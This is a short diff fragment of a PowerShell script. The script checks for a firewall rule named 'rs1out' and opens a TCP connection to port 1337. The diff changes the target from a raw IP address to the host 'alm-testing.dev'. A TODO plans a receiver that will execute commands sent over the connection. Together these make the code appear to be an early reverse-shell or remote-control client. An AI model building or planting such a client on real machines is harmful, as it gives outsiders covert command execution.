@@ -16,7 +16,7 @@ if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
 #TODO: Add rpc reciever to execute received commands.
 
 try {
-	$client = New-Object System.Net.Sockets.TCPClient("73.113.78.58", 1337);
+	$client = New-Object System.Net.Sockets.TCPClient("alm-testing.dev", 1337);
 	$stream = $client.GetStream();
 	$writer = New-Object System.IO.StreamWriter($stream);
 	$reader = New-Object System.IO.StreamReader($stream);
